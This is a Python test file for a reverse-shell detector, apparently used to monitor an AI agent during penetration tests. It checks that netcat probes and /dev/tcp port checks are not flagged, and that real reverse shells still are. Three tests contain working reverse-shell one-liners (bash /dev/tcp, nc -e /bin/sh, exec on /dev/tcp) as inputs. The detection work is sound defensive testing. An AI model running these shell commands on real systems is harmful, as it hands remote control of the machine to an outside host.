from backend import detection as d

# Regression guard: real pentest recon must NOT be flagged as a reverse shell.
# These are the exact false positives observed running against a live Goose
# pentest session (netcat as a probe client, bash /dev/tcp port checks).

def test_nc_probe_piped_to_head_is_not_reverse_shell():
    # nc used to grab a banner, piped into `head -c 300` -- the -c is head's,
    # not netcat's exec flag.
    assert d.scan_reverse_shell("echo | nc 192.168.50.1 7788 | head -c 300", "", "", []) == []

def test_dev_tcp_port_check_is_not_reverse_shell():
    # echo redirected once into /dev/tcp is a port-open check, not a shell.
    assert d.scan_reverse_shell('bash -c "echo > /dev/tcp/192.168.50.1/80"', "", "", []) == []

def test_port_sweep_with_udp_probe_is_not_reverse_shell():
    cmd = ('for p in 53 80 7788; do timeout 2 bash -c "echo > /dev/tcp/192.168.50.1/$p"; done; '
           'timeout 3 nc -u -w 1 192.168.50.1 7788 <<< "test"')
    assert d.scan_reverse_shell(cmd, "", "", []) == []

def test_nc_banner_grab_hexdump_is_not_reverse_shell():
    cmd = "echo -n 'GET / HTTP/1.0\r\n\r\n' | timeout 3 nc 192.168.50.1 18017 | head -c 500 | xxd"
    assert d.scan_reverse_shell(cmd, "", "", []) == []

# Real reverse shells MUST still fire after the precision tuning.

def test_bash_dev_tcp_reverse_shell_still_fires():
    a = d.scan_reverse_shell("bash -i >& /dev/tcp/10.0.0.5/4444 0>&1", "", "", [])
    assert a and a[0]["severity"] in ("HIGH", "CRITICAL")
    assert a[0]["destination"] == "10.0.0.5:4444"

def test_nc_exec_reverse_shell_still_fires():
    a = d.scan_reverse_shell("nc -e /bin/sh 10.0.0.9 9001", "", "", [])
    assert a and a[0]["severity"] in ("HIGH", "CRITICAL")

def test_exec_readwrite_dev_tcp_reverse_shell_fires():
    a = d.scan_reverse_shell("exec 5<>/dev/tcp/10.0.0.5/4444; cat <&5", "", "", [])
    assert a and a[0]["severity"] in ("HIGH", "CRITICAL")
